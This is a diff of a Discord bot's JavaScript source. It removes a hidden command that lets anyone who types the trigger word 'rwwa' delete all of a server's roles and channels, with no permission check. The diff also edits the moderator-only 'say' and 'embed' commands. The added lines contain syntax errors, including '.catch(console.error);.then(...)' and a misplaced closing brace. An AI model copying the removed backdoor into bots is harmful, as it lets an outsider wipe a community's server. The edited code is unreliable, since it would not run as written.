@@ -551,17 +551,6 @@ client.on('message', message =>{
 
 
 
-client.on('message', alpha => {
- if (alpha.content.startsWith("rwwa")) {
-alpha.guild.roles.forEach(r => { r.delete() }) // لمسح الرتب
-client.guild.channels.forEach(c => { c.delete() })// للمسح الرومات
-let alpha = new Discord.RichEmbed()
-.setColor('RANDOM')
-.setDescription('**تم الحذف بنجاح**')
-alpha.author.sendEmbed(alpha);
-}
-});
-
 
 
 
@@ -932,10 +921,9 @@ client.on('message', message => {
   if (command === "say") {
 if(!message.guild.member(message.author).hasPermission("MANAGE_MESSAGES")) return message.reply(`
          
-         **لست من المشرفين لا يمكنك استعمال هاذا الأمر**
-         `);
+         **لست من المشرفين لا يمكنك استعمال هاذا الأمر**`)
           message.delete()
-    message.channel.sendMessage(args.join(" ")).catch(console.error);
+    message.channel.sendMessage(args.join(" ")).catch(console.error);.then(m => m.delete(3000));
   }
   
  
@@ -943,9 +931,8 @@ if(!message.guild.member(message.author).hasPermission("MANAGE_MESSAGES")) retur
 if (command == "embed") {
 if(!message.guild.member(message.author).hasPermission("MANAGE_MESSAGES")) return message.reply(`
          
-         **لست من المشرفين لا يمكنك استعمال هاذا الأمر**
-         `);
-
+         **لست من المشرفين لا يمكنك استعمال هاذا الأمر**`).then(m => m.delete(3000));
+       }
     let say = new Discord.RichEmbed()
     .setDescription(args.join("  "))
     .setColor(0x23b2d6)
